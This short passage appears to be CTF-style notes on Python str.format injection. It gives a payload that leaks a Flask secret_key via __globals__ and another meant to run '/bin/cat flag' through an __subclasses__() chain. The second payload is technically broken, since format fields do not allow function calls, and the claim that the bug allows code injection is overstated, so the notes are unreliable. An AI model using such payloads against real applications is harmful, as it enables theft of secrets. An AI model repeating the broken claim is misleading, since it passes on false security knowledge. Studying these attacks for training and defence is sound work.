...
- Mutable variables
  ...
  - If the format function is used on a string we control, we can do a string format attack
    - ex: user_input = "{meow}"
    - username = user_input.format(meow=Object())
    - meow -> "<__main__.Object object at 0x7f8c8c8c8c8c>"
    - That means we can inject code
      - ex: user_input = "{meow.__globals__[app].secret_key}" -> Our string will be replaced with the value of secret_key
      - ex: user_input = "{meow.__class__.__bases__[0].__subclasses__()[356](["/bin/cat","flag"], stdout=-1).communicate()}" -> This will execute the command and return the output 
### Python 2
